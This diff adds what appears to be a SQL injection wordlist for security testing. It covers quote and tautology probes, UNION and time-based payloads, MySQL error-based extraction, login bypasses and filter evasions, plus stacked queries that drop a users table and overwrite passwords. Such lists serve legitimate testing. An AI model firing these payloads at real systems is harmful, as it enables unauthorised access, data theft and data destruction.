@@ -1,0 +1,68 @@
+# SQL Injection Payloads
+# Error-based and Boolean-based SQL injection test payloads
+
+# Basic quotes
+'
+"
+`
+
+# Basic OR conditions
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+" OR "1"="1" --
+' OR '1'='1' /*
+' OR '1'='1' #
+
+# Numeric injections
+1 OR 1=1
+1' OR '1'='1
+1" OR "1"="1
+1 AND 1=1
+1 AND 1=2
+
+# Comment injections
+'--
+"--
+'#
+"#
+'/*
+"/*
+
+# UNION-based injections
+' UNION SELECT NULL--
+' UNION SELECT NULL, NULL--
+' UNION SELECT NULL, NULL, NULL--
+' UNION ALL SELECT NULL--
+' UNION SELECT 1,2,3--
+" UNION SELECT NULL--
+
+# Time-based injections
+' OR SLEEP(5)--
+" OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' OR BENCHMARK(5000000, SHA1('test'))--
+' OR pg_sleep(5)--
+1; SELECT SLEEP(5)--
+
+# Stacked queries
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','hacked')--
+'; UPDATE users SET password='hacked'--
+
+# Error-based (MySQL)
+' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--
+' AND UPDATEXML(1, CONCAT(0x7e, VERSION()), 1)--
+
+# Login bypass
+admin'--
+admin' #
+admin'/*
+' OR 1=1--
+' OR ''='
+' OR 'x'='x
+
+# Advanced bypasses
+' /*!50000OR*/ '1'='1
+' %26%26 '1'='1
+' || '1'='1
